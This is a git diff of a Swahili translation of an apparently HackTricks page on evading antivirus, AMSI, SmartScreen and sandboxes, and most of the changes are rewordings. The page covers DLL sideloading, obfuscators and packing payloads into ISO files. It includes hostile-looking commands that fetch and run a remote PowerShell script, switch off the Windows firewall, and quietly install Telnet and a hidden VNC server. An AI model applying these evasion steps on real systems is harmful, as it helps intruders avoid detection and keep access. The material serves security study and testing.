@@ -10,14 +10,14 @@ Jifunze na fanya mazoezi ya GCP Hacking: <img src="../.gitbook/assets/grte.png" 
 
 * Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
 * **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-Ikiwa unavutiwa na **kazi ya udukuzi** na kudukuza yasiyoweza kudukuliwa - **tunatafuta wafanyakazi!** (_kuandika na kuzungumza kwa ufasaha Kiswahili kunahitajika_).
+Ikiwa unavutiwa na **kazi ya udukuzi** na kudukuza yasiyoweza kudukuliwa - **tunatafuta wafanyakazi!** (_kuandika na kuzungumza kwa ufasaha kwa Kipolandi kunahitajika_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
@@ -29,11 +29,11 @@ Kwa sasa, AVs hutumia mbinu tofauti za kuangalia ikiwa faili ni mbaya au la, ugu
 
 ### **Static detection**
 
-Ugunduzi wa statiki unapatikana kwa kuashiria nyuzi au safu za byte zinazojulikana kuwa mbaya katika binary au script, na pia kutoa taarifa kutoka kwa faili yenyewe (mfano, maelezo ya faili, jina la kampuni, saini za dijitali, ikoni, checksum, nk.). Hii inamaanisha kwamba kutumia zana za umma zinazojulikana kunaweza kukusababisha kukamatwa kwa urahisi zaidi, kwani huenda zimechambuliwa na kuashiriwa kama mbaya. Kuna njia kadhaa za kuzunguka aina hii ya ugunduzi:
+Ugunduzi wa statiki unapatikana kwa kuweka alama kwenye nyuzi au safu za byte zinazojulikana kuwa mbaya katika binary au script, na pia kutoa taarifa kutoka kwa faili yenyewe (mfano, maelezo ya faili, jina la kampuni, saini za kidijitali, ikoni, checksum, nk.). Hii inamaanisha kwamba kutumia zana za umma zinazojulikana kunaweza kukufanya ukamatwe kwa urahisi zaidi, kwani huenda zimechambuliwa na kuwekwa alama kama mbaya. Kuna njia kadhaa za kuzunguka aina hii ya ugunduzi:
 
 * **Encryption**
 
-Ikiwa unashughulikia binary, hakutakuwa na njia ya AV kugundua programu yako, lakini utahitaji aina fulani ya loader ili kufungua na kuendesha programu hiyo kwenye kumbukumbu.
+Ikiwa unashughulikia binary, hakutakuwa na njia kwa AV kugundua programu yako, lakini utahitaji aina fulani ya loader ili kufungua na kuendesha programu kwenye kumbukumbu.
 
 * **Obfuscation**
 
@@ -44,20 +44,20 @@ Wakati mwingine unachohitaji kufanya ni kubadilisha nyuzi fulani katika binary a
 Ikiwa unaunda zana zako mwenyewe, hakutakuwa na saini mbaya zinazojulikana, lakini hii inachukua muda na juhudi nyingi.
 
 {% hint style="info" %}
-Njia nzuri ya kuangalia dhidi ya ugunduzi wa statiki wa Windows Defender ni [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Kimsingi inagawanya faili katika sehemu nyingi kisha inamwambia Defender kuchanganua kila moja kwa wakati mmoja, kwa njia hii, inaweza kukuambia ni zipi nyuzi au byte zilizoorodheshwa katika binary yako.
+Njia nzuri ya kuangalia dhidi ya ugunduzi wa statiki wa Windows Defender ni [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Kimsingi inagawanya faili katika sehemu nyingi kisha inamwambia Defender kuchanganua kila moja kwa kibinafsi, kwa njia hii, inaweza kukuambia ni zipi ambazo zimewekwa alama katika binary yako.
 {% endhint %}
 
 Ninapendekeza uangalie hii [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf) kuhusu AV Evasion ya vitendo.
 
 ### **Dynamic analysis**
 
-Uchambuzi wa dinamik ni wakati AV inakimbiza binary yako kwenye sandbox na kuangalia shughuli mbaya (mfano, kujaribu kufungua na kusoma nywila za kivinjari chako, kufanya minidump kwenye LSASS, nk.). Sehemu hii inaweza kuwa ngumu kidogo kufanya kazi nayo, lakini hapa kuna mambo kadhaa unayoweza kufanya ili kuzuia sandboxes.
+Uchambuzi wa dinamik ni wakati AV inakimbia binary yako katika sandbox na kuangalia shughuli mbaya (mfano, kujaribu kufungua na kusoma nywila za kivinjari chako, kufanya minidump kwenye LSASS, nk.). Sehemu hii inaweza kuwa ngumu kidogo kufanya kazi nayo, lakini hapa kuna mambo kadhaa unayoweza kufanya ili kuzuia sandboxes.
 
-* **Sleep before execution** Kutegemea jinsi ilivyotekelezwa, inaweza kuwa njia nzuri ya kupita uchambuzi wa dinamik wa AV. AVs zina muda mfupi sana wa kuchanganua faili ili kusiwe na usumbufu katika mtiririko wa kazi wa mtumiaji, hivyo kutumia usingizi mrefu kunaweza kuingilia uchambuzi wa binaries. Tatizo ni kwamba sandboxes nyingi za AV zinaweza tu kupuuza usingizi kulingana na jinsi ilivyotekelezwa.
-* **Checking machine's resources** Kawaida Sandboxes zina rasilimali chache sana za kufanya kazi (mfano, < 2GB RAM), vinginevyo zinaweza kuharibu mashine ya mtumiaji. Unaweza pia kuwa mbunifu sana hapa, kwa mfano kwa kuangalia joto la CPU au hata kasi za mashabiki, si kila kitu kitawekwa kwenye sandbox.
-* **Machine-specific checks** Ikiwa unataka kulenga mtumiaji ambaye kompyuta yake imeunganishwa kwenye eneo la "contoso.local", unaweza kufanya ukaguzi kwenye eneo la kompyuta ili kuona ikiwa inalingana na ile uliyotaja, ikiwa haifai, unaweza kufanya programu yako itoke.
+* **Sleep before execution** Kutegemea jinsi ilivyotekelezwa, inaweza kuwa njia nzuri ya kupita uchambuzi wa dinamik wa AV. AVs zina muda mfupi sana wa kuchanganua faili ili kutoingilia kati mtiririko wa kazi wa mtumiaji, hivyo kutumia usingizi mrefu kunaweza kuingilia uchambuzi wa binaries. Tatizo ni kwamba sandboxes nyingi za AV zinaweza tu kupuuzilia mbali usingizi kulingana na jinsi ilivyotekelezwa.
+* **Checking machine's resources** Kawaida Sandboxes zina rasilimali chache sana za kufanya kazi (mfano, < 2GB RAM), vinginevyo zinaweza kuharibu mashine ya mtumiaji. Unaweza pia kuwa mbunifu sana hapa, kwa mfano kwa kuangalia joto la CPU au hata kasi za mashabiki, si kila kitu kitawekwa katika sandbox.
+* **Machine-specific checks** Ikiwa unataka kulenga mtumiaji ambaye kituo chake kimeunganishwa kwenye eneo la "contoso.local", unaweza kufanya ukaguzi kwenye eneo la kompyuta ili kuona ikiwa inalingana na ile uliyotaja, ikiwa haifai, unaweza kufanya programu yako itoke.
 
-Inageuka kuwa jina la kompyuta la Sandbox la Microsoft Defender ni HAL9TH, hivyo, unaweza kuangalia jina la kompyuta katika malware yako kabla ya kulipuka, ikiwa jina linalingana na HAL9TH, inamaanisha uko ndani ya sandbox ya defender, hivyo unaweza kufanya programu yako itoke.
+Inageuka kuwa jina la kompyuta la Microsoft Defender's Sandbox ni HAL9TH, hivyo, unaweza kuangalia jina la kompyuta katika malware yako kabla ya kulipuka, ikiwa jina linalingana na HAL9TH, inamaanisha uko ndani ya sandbox ya defender, hivyo unaweza kufanya programu yako itoke.
 
 <figure><img src="../.gitbook/assets/image (209).png" alt=""><figcaption><p>chanzo: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>
 
@@ -67,23 +67,23 @@ Vidokezo vingine vizuri kutoka [@mgeeky](https://twitter.com/mariuszbit) kwa kup
 
 Kama tulivyosema hapo awali katika chapisho hili, **ztools za umma** hatimaye **zitagundulika**, hivyo, unapaswa kujiuliza kitu:
 
-Kwa mfano, ikiwa unataka kudump LSASS, **je, unahitaji kweli kutumia mimikatz**? Au unaweza kutumia mradi mwingine ambao haujulikani sana na pia unadump LSASS.
+Kwa mfano, ikiwa unataka kudondosha LSASS, **je, unahitaji kweli kutumia mimikatz**? Au unaweza kutumia mradi mwingine ambao haujulikani sana na pia unadondosha LSASS.
 
-Jibu sahihi labda ni la pili. Kuchukua mimikatz kama mfano, huenda ni moja ya, ikiwa si kipande cha malware kilichoorodheshwa zaidi na AVs na EDRs, wakati mradi wenyewe ni mzuri sana, pia ni ndoto mbaya kufanya kazi nayo ili kuzunguka AVs, hivyo angalia tu mbadala kwa kile unachojaribu kufikia.
+Jibu sahihi labda ni la pili. Kuchukua mimikatz kama mfano, huenda ni moja ya, ikiwa si kipande kilichowekwa alama zaidi na AVs na EDRs, wakati mradi wenyewe ni mzuri sana, pia ni ndoto mbaya kufanya kazi nayo ili kuzunguka AVs, hivyo angalia tu mbadala kwa kile unachojaribu kufikia.
 
 {% hint style="info" %}
-Wakati unabadilisha payloads zako kwa ajili ya kuzuia, hakikisha **unazima uwasilishaji wa sampuli kiotomatiki** katika defender, na tafadhali, kwa dhati, **USIWEKE KATIKA VIRUSTOTAL** ikiwa lengo lako ni kufikia kuzuia kwa muda mrefu. Ikiwa unataka kuangalia ikiwa payload yako inagundulika na AV fulani, i-install kwenye VM, jaribu kuzima uwasilishaji wa sampuli kiotomatiki, na uijaribu huko hadi uridhike na matokeo.
+Unapobadilisha payloads zako kwa ajili ya kuzuia, hakikisha **unazima uwasilishaji wa sampuli kiotomatiki** katika defender, na tafadhali, kwa kweli, **USIWEKE KATIKA VIRUSTOTAL** ikiwa lengo lako ni kufikia kuzuia kwa muda mrefu. Ikiwa unataka kuangalia ikiwa payload yako inagundulika na AV fulani, i-install kwenye VM, jaribu kuzima uwasilishaji wa sampuli kiotomatiki, na jaribu hapo hadi uridhike na matokeo.
 {% endhint %}
 
 ## EXEs vs DLLs
 
-Kila wakati inavyowezekana, daima **kipa kipaumbele kutumia DLLs kwa ajili ya kuzuia**, katika uzoefu wangu, faili za DLL kwa kawaida **huzuiliwa kidogo** na kuchambuliwa, hivyo ni hila rahisi sana kutumia ili kuepuka kugundulika katika baadhi ya matukio (ikiwa payload yako ina njia yoyote ya kuendesha kama DLL bila shaka).
+Kila wakati inavyowezekana, daima **kipa kipaumbele kutumia DLLs kwa ajili ya kuzuia**, katika uzoefu wangu, faili za DLL kwa kawaida **huzuiliwa kidogo** na kuchambuliwa, hivyo ni hila rahisi sana kutumia ili kuepuka kugundulika katika baadhi ya matukio (ikiwa payload yako ina njia yoyote ya kukimbia kama DLL bila shaka).
 
 Kama tunavyoona katika picha hii, Payload ya DLL kutoka Havoc ina kiwango cha kugundulika cha 4/26 katika antiscan.me, wakati payload ya EXE ina kiwango cha kugundulika cha 7/26.
 
-<figure><img src="../.gitbook/assets/image (1130).png" alt=""><figcaption><p>kulinganisha antiscan.me ya payload ya kawaida ya Havoc EXE dhidi ya DLL ya kawaida ya Havoc</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1130).png" alt=""><figcaption><p>antiscan.me kulinganisha payload ya kawaida ya Havoc EXE dhidi ya kawaida ya Havoc DLL</p></figcaption></figure>
 
-Sasa tutakuonyesha hila kadhaa unazoweza kutumia na faili za DLL ili kuwa na ufanisi zaidi.
+Sasa tutawonyesha hila kadhaa unazoweza kutumia na faili za DLL ili kuwa na ufanisi zaidi.
 
 ## DLL Sideloading & Proxying
 
@@ -102,7 +102,7 @@ C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hija
 
 Amri hii itatoa orodha ya programu zinazoweza kuathiriwa na DLL hijacking ndani ya "C:\Program Files\\" na faili za DLL wanazojaribu kupakia.
 
-Ninapendekeza sana **uchunguze programu zinazoweza kuathiriwa na DLL Hijackable/Sideloadable mwenyewe**, mbinu hii ni ya siri sana ikiwa itafanywa vizuri, lakini ukitumia programu zinazojulikana za DLL Sideloadable, unaweza kukamatwa kwa urahisi.
+Ninapendekeza sana **uchunguze programu zinazoweza kuathiriwa na DLL Hijackable/Sideloadable mwenyewe**, mbinu hii ni ya siri sana ikiwa itafanywa vizuri, lakini ikiwa utatumia programu zinazojulikana za DLL Sideloadable, unaweza kukamatwa kwa urahisi.
 
 Kuweka tu DLL mbaya yenye jina ambalo programu inatarajia kupakia, haitapakia mzigo wako, kwani programu inatarajia kazi maalum ndani ya DLL hiyo, ili kutatua tatizo hili, tutatumia mbinu nyingine inayoitwa **DLL Proxying/Forwarding**.
 
@@ -121,7 +121,7 @@ Hizi ndizo hatua nilizofuata:
 ```
 {% endcode %}
 
-Amri ya mwisho itatupa faili 2: kiolezo cha msimbo wa chanzo cha DLL, na DLL iliyobadilishwa jina.
+Amri ya mwisho itatupa faili 2: kiolezo cha msimbo wa chanzo cha DLL, na DLL ya asili iliyobadilishwa jina.
 
 <figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
 
@@ -172,7 +172,7 @@ Kipengele cha AMSI kimejumuishwa katika sehemu hizi za Windows.
 * JavaScript na VBScript
 * Office VBA macros
 
-Inaruhusu suluhisho za antivirus kuchunguza tabia ya script kwa kufichua maudhui ya script katika mfumo ambao si wa siri na si wa kufichwa.
+Inaruhusu suluhisho za antivirus kuchunguza tabia ya script kwa kufichua maudhui ya script katika mfumo ambao haujaandikwa kwa siri na haujawekwa gizani.
 
 Kukimbia `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` kutazalisha arifa ifuatayo kwenye Windows Defender.
 
@@ -196,7 +196,7 @@ Kwa kuwa AMSI inatekelezwa kwa kupakia DLL kwenye mchakato wa powershell (pia cs
 
 **Kulazimisha Kosa**
 
-Kulazimisha kuanzishwa kwa AMSI kufeli (amsiInitFailed) kutasababisha kwamba hakuna skanning itakayofanywa kwa mchakato wa sasa. Awali hii ilifunuliwa na [Matt Graeber](https://twitter.com/mattifestation) na Microsoft imeunda saini ili kuzuia matumizi makubwa. 
+Kulazimisha kuanzishwa kwa AMSI kufeli (amsiInitFailed) kutasababisha kwamba hakuna skanning itakayofanywa kwa mchakato wa sasa. Awali hii ilifunuliwa na [Matt Graeber](https://twitter.com/mattifestation) na Microsoft imeunda saini ili kuzuia matumizi makubwa zaidi.
 
 {% code overflow="wrap" %}
 ```powershell
@@ -204,7 +204,7 @@ Kulazimisha kuanzishwa kwa AMSI kufeli (amsiInitFailed) kutasababisha kwamba hak
 ```
 {% endcode %}
 
-Ilichukua mstari mmoja tu wa msimbo wa powershell kufanya AMSI isitumike kwa mchakato wa powershell wa sasa. Mstari huu umewekwa alama na AMSI yenyewe, hivyo mabadiliko fulani yanahitajika ili kutumia mbinu hii.
+Ilichukua tu mstari mmoja wa msimbo wa powershell kufanya AMSI isitumike kwa mchakato wa powershell wa sasa. Mstari huu umewekwa alama na AMSI yenyewe, hivyo mabadiliko fulani yanahitajika ili kutumia mbinu hii.
 
 Hapa kuna AMSI bypass iliyobadilishwa niliyopata kutoka kwa [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
 ```powershell
@@ -224,7 +224,7 @@ Keep in mind, that this will probably get flagged once this post comes out, so y
 
 **Memory Patching**
 
-Teknolojia hii iligunduliwa awali na [@RastaMouse](https://twitter.com/\_RastaMouse/) na inahusisha kutafuta anwani ya kazi "AmsiScanBuffer" katika amsi.dll (inayohusika na kusafisha ingizo lililotolewa na mtumiaji) na kuandika upya na maagizo ya kurudisha msimbo wa E\_INVALIDARG, kwa njia hii, matokeo ya uchunguzi halisi yatarudisha 0, ambayo inatafsiriwa kama matokeo safi.
+Teknolojia hii iligunduliwa awali na [@RastaMouse](https://twitter.com/\_RastaMouse/) na inahusisha kutafuta anwani ya kazi "AmsiScanBuffer" katika amsi.dll (inayohusika na kusanifu ingizo la mtumiaji) na kuandika tena na maagizo ya kurudisha msimbo wa E\_INVALIDARG, kwa njia hii, matokeo ya uchunguzi halisi yatarudisha 0, ambayo inatafsiriwa kama matokeo safi.
 
 {% hint style="info" %}
 Tafadhali soma [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) kwa maelezo zaidi.
@@ -232,19 +232,19 @@ Tafadhali soma [https://rastamouse.me/memory-patching-amsi-bypass/](https://rast
 
 Kuna pia mbinu nyingi nyingine zinazotumika kupita AMSI kwa kutumia powershell, angalia [**ukurasa huu**](basic-powershell-for-pentesters/#amsi-bypass) na [repo hii](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) kujifunza zaidi kuhusu hizo.
 
-Au hii skripti ambayo kupitia urekebishaji wa kumbukumbu itarekebisha kila Powersh mpya
+Au hii skripti ambayo kupitia memory patching itafanya patch kila mpya ya Powersh
 
 ## Obfuscation
 
-Kuna zana kadhaa ambazo zinaweza kutumika ku **ficha msimbo wa C# wa wazi**, kuunda **mifano ya metaprogramming** ili kukusanya binaries au **kuficha binaries zilizokusanywa** kama vile:
+Kuna zana kadhaa ambazo zinaweza kutumika **kuficha msimbo wa C#** wa wazi, kuunda **mifano ya metaprogramming** ili kukusanya binaries au **kuficha binaries zilizokusanywa** kama:
 
-* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: Kificha msimbo wa C#**
-* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lengo la mradi huu ni kutoa toleo la chanzo wazi la [LLVM](http://www.llvm.org/) suite ya kukusanya inayoweza kutoa usalama wa programu ulioimarishwa kupitia [kuficha msimbo](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) na kuzuia mabadiliko.
-* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator inaonyesha jinsi ya kutumia lugha ya `C++11/14` kuunda, wakati wa kukusanya, msimbo wa kufichwa bila kutumia zana yoyote ya nje na bila kubadilisha mkusanyaji.
-* [**obfy**](https://github.com/fritzone/obfy): Ongeza safu ya operesheni zilizofichwa zinazozalishwa na mfumo wa metaprogramming wa C++ ambao utaifanya maisha ya mtu anayetaka kuvunja programu kuwa magumu kidogo.
-* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ni kificha msimbo wa x64 ambacho kinaweza kuficha aina mbalimbali za faili za pe ikiwa ni pamoja na: .exe, .dll, .sys
+* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
+* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lengo la mradi huu ni kutoa toleo la wazi la [LLVM](http://www.llvm.org/) suite ya kukusanya inayoweza kutoa usalama wa programu ulioimarishwa kupitia [kuficha msimbo](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) na kuzuia mabadiliko.
+* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator inaonyesha jinsi ya kutumia lugha ya `C++11/14` kuunda, wakati wa kukusanya, msimbo uliofichwa bila kutumia zana yoyote ya nje na bila kubadilisha mkusanyaji.
+* [**obfy**](https://github.com/fritzone/obfy): Ongeza safu ya operesheni zilizofichwa zinazozalishwa na mfumo wa metaprogramming wa C++ template ambao utaifanya maisha ya mtu anayetaka kuvunja programu kuwa magumu kidogo.
+* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ni obfuscator wa binary x64 ambaye anaweza kuficha aina mbalimbali za faili za pe ikiwa ni pamoja na: .exe, .dll, .sys
 * [**metame**](https://github.com/a0rtega/metame): Metame ni injini rahisi ya msimbo wa metamorphic kwa ajili ya executable zisizo na mipaka.
-* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ni mfumo wa kuficha msimbo wa kiwango kidogo kwa lugha zinazoungwa mkono na LLVM kwa kutumia ROP (programming inayotegemea kurudi). ROPfuscator inaficha programu katika kiwango cha msimbo wa mkusanyiko kwa kubadilisha maagizo ya kawaida kuwa minyororo ya ROP, ikizuia dhana yetu ya kawaida ya mtiririko wa kudhibiti wa kawaida.
+* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ni mfumo wa kuficha msimbo wa kiwango kidogo kwa lugha zinazoungwa mkono na LLVM kwa kutumia ROP (programming oriented return). ROPfuscator inaficha programu katika kiwango cha msimbo wa mkusanyiko kwa kubadilisha maagizo ya kawaida kuwa minyororo ya ROP, ikizuia dhana yetu ya kawaida ya mtiririko wa kudhibiti wa kawaida.
 * [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ni .NET PE Crypter iliyoandikwa kwa Nim
 * [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor ina uwezo wa kubadilisha EXE/DLL zilizopo kuwa shellcode na kisha kuzipeleka
 
@@ -256,21 +256,21 @@ Microsoft Defender SmartScreen ni mekanismu ya usalama iliyokusudiwa kulinda mtu
 
 <figure><img src="../.gitbook/assets/image (664).png" alt=""><figcaption></figcaption></figure>
 
-SmartScreen inafanya kazi hasa kwa njia ya msingi wa sifa, ikimaanisha kwamba programu zisizokuwa za kawaida zinazoshushwa zitasababisha SmartScreen hivyo kuonya na kuzuia mtumiaji wa mwisho kutekeleza faili hiyo (ingawa faili hiyo bado inaweza kutekelezwa kwa kubofya Taarifa Zaidi -> Endesha hata hivyo).
+SmartScreen inafanya kazi hasa kwa njia ya msingi wa sifa, ikimaanisha kwamba programu zisizokuwa za kawaida zinazoshushwa zitaanzisha SmartScreen na hivyo kuonya na kuzuia mtumiaji wa mwisho kutekeleza faili hiyo (ingawa faili hiyo bado inaweza kutekelezwa kwa kubofya Taarifa Zaidi -> Endesha hata hivyo).
 
-**MoTW** (Alama ya Mtandao) ni [NTFS Alternate Data Stream](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\)) yenye jina la Zone.Identifier ambayo huundwa kiotomatiki wakati wa kushusha faili kutoka mtandao, pamoja na URL ambayo ilishushwa kutoka.
+**MoTW** (Mark of The Web) ni [NTFS Alternate Data Stream](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\)) yenye jina la Zone.Identifier ambayo huundwa kiotomatiki wakati wa kushusha faili kutoka mtandao, pamoja na URL ambayo ilishushwa kutoka.
 
 <figure><img src="../.gitbook/assets/image (237).png" alt=""><figcaption><p>Kukagua Zone.Identifier ADS kwa faili iliyoshushwa kutoka mtandao.</p></figcaption></figure>
 
 {% hint style="info" %}
-Ni muhimu kutambua kwamba executable zilizosainiwa kwa cheti cha **kuaminika** **hazitazindua SmartScreen**.
+Ni muhimu kutambua kwamba executable zilizosainiwa na cheti cha **kuaminika** **hazitazindua SmartScreen**.
 {% endhint %}
 
-Njia yenye ufanisi sana ya kuzuia payloads zako kupata Alama ya Mtandao ni kwa kuzifunga ndani ya aina fulani ya kontena kama ISO. Hii inatokea kwa sababu Alama-ya-Mtandao (MOTW) **haiwezi** kutumika kwa **volumu zisizo za NTFS**.
+Njia yenye ufanisi sana ya kuzuia payloads zako kupata Mark of The Web ni kwa kuzifunga ndani ya aina fulani ya kontena kama ISO. Hii inatokea kwa sababu Mark-of-the-Web (MOTW) **haiwezi** kutumika kwa **volumu zisizo za NTFS**.
 
 <figure><img src="../.gitbook/assets/image (640).png" alt=""><figcaption></figcaption></figure>
 
-[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ni zana inayofunga payloads ndani ya kontena za matokeo ili kuepuka Alama-ya-Mtandao.
+[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ni zana inayofunga payloads katika kontena za matokeo ili kuepuka Mark-of-the-Web.
 
 Mfano wa matumizi:
 ```powershell
@@ -308,13 +308,13 @@ Mifumo mingi ya C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, nk.) taya
 
 * **Fork\&Run**
 
-Inahusisha **kuanzisha mchakato mpya wa dhabihu**, ingiza msimbo wako mbaya wa baada ya unyakuzi kwenye mchakato huo mpya, tekeleza msimbo wako mbaya na unapokamilisha, uue mchakato mpya. Hii ina faida na hasara zake. Faida ya njia ya fork na run ni kwamba utekelezaji unafanyika **nje** ya mchakato wetu wa Beacon implant. Hii ina maana kwamba ikiwa kitu katika hatua zetu za baada ya unyakuzi kitatokea vibaya au kukamatwa, kuna **uwezekano mkubwa** wa **implant yetu kuishi.** Hasara ni kwamba una **uwezekano mkubwa** wa kukamatwa na **Uchunguzi wa Tabia**.
+Inahusisha **kuanzisha mchakato mpya wa dhabihu**, ingiza msimbo wako mbaya wa baada ya unyakuzi kwenye mchakato huo mpya, tekeleza msimbo wako mbaya na unapomaliza, uue mchakato mpya. Hii ina faida na hasara zake. Faida ya njia ya fork na run ni kwamba utekelezaji unafanyika **nje** ya mchakato wetu wa Beacon implant. Hii ina maana kwamba ikiwa kitu katika hatua zetu za baada ya unyakuzi kitatokea vibaya au kukamatwa, kuna **uwezekano mkubwa zaidi** wa **implant yetu kuishi.** Hasara ni kwamba una **uwezekano mkubwa zaidi** wa kukamatwa na **Mikakati ya Tabia**.
 
 <figure><img src="../.gitbook/assets/image (215).png" alt=""><figcaption></figcaption></figure>
 
 * **Inline**
 
-Inahusisha kuingiza msimbo wako mbaya wa baada ya unyakuzi **katika mchakato wake mwenyewe**. Kwa njia hii, unaweza kuepuka kuunda mchakato mpya na kuupitisha kwa AV, lakini hasara ni kwamba ikiwa kitu kitatokea vibaya na utekelezaji wa payload yako, kuna **uwezekano mkubwa** wa **kupoteza beacon yako** kwani inaweza kuanguka.
+Ni kuhusu kuingiza msimbo wako mbaya wa baada ya unyakuzi **katika mchakato wake mwenyewe**. Kwa njia hii, unaweza kuepuka kuunda mchakato mpya na kuupitisha kwa AV, lakini hasara ni kwamba ikiwa kitu kitatokea vibaya na utekelezaji wa payload yako, kuna **uwezekano mkubwa zaidi** wa **kupoteza beacon yako** kwani inaweza kuanguka.
 
 <figure><img src="../.gitbook/assets/image (1136).png" alt=""><figcaption></figcaption></figure>
 
@@ -326,11 +326,11 @@ You can also load C# Assemblies **from PowerShell**, check out [Invoke-SharpLoad
 
 ## Using Other Programming Languages
 
-Kama ilivyopendekezwa katika [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), inawezekana kutekeleza msimbo mbaya kwa kutumia lugha nyingine kwa kutoa mashine iliyovunjwa ufikiaji **wa mazingira ya tafsiri yaliyojinstalled kwenye SMB share inayodhibitiwa na Mshambuliaji**.
+Kama ilivyopendekezwa katika [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), inawezekana kutekeleza msimbo mbaya kwa kutumia lugha nyingine kwa kutoa mashine iliyovunjwa ufikiaji **wa mazingira ya tafsiri yaliyojinstalled kwenye sehemu ya SMB inayodhibitiwa na Mshambuliaji**.
 
-Kwa kuruhusu ufikiaji wa Binaries za Mfasiri na mazingira kwenye SMB share unaweza **kutekeleza msimbo wowote katika lugha hizi ndani ya kumbukumbu** ya mashine iliyovunjwa.
+Kwa kuruhusu ufikiaji wa Binaries za Mfasiri na mazingira kwenye sehemu ya SMB unaweza **kutekeleza msimbo wowote katika hizi lugha ndani ya kumbukumbu** ya mashine iliyovunjwa.
 
-Repo inaonyesha: Defender bado inachunguza skripti lakini kwa kutumia Go, Java, PHP nk tuna **uwezo zaidi wa kupita saini za statiki**. Kujaribu na skripti za shell za nyuma zisizo na ufichuzi katika lugha hizi kumethibitishwa kuwa na mafanikio.
+Repo inaonyesha: Defender bado inachunguza scripts lakini kwa kutumia Go, Java, PHP nk tuna **uwezo zaidi wa kupita saini za statiki**. Kujaribu na scripts za shell za nyuma zisizo na ufichuzi katika hizi lugha kumethibitishwa kuwa na mafanikio.
 
 ## Advanced Evasion
 
@@ -351,11 +351,11 @@ Hii pia ni hotuba nyingine nzuri kutoka [@mariuszbit](https://twitter.com/marius
 ### **Check which parts Defender finds as malicious**
 
 Unaweza kutumia [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) ambayo it **ondoa sehemu za binary** hadi **ipate sehemu ambayo Defender** inapata kama mbaya na kuigawanya kwako.\
-Zana nyingine inayofanya **kitu sawa ni** [**avred**](https://github.com/dobin/avred) ikiwa na huduma ya wavuti wazi inatoa huduma katika [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)
+Zana nyingine inayofanya **kitu sawa ni** [**avred**](https://github.com/dobin/avred) ikiwa na wavuti wazi inayotoa huduma katika [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)
 
 ### **Telnet Server**
 
-Hadi Windows10, Windows zote zilikuja na **seva ya Telnet** ambayo unaweza kusakinisha (kama msimamizi) kwa kufanya:
+Hadi Windows10, Windows zote zilikuja na **seva ya Telnet** ambayo unaweza kufunga (kama msimamizi) kwa kufanya:
 ```bash
 pkgmgr /iu:"TelnetServer" /quiet
 ```
@@ -372,19 +372,19 @@ netsh advfirewall set allprofiles state off
 
 Pakua kutoka: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (unataka upakuaji wa bin, si usanidi)
 
-**KATIKA HOST**: Tekeleza _**winvnc.exe**_ na uweke usanidi wa seva:
+**KATIKA HOST**: Tekeleza _**winvnc.exe**_ na uweke server:
 
-* Wezesha chaguo _Disable TrayIcon_
+* Washa chaguo _Disable TrayIcon_
 * Weka nenosiri katika _VNC Password_
 * Weka nenosiri katika _View-Only Password_
 
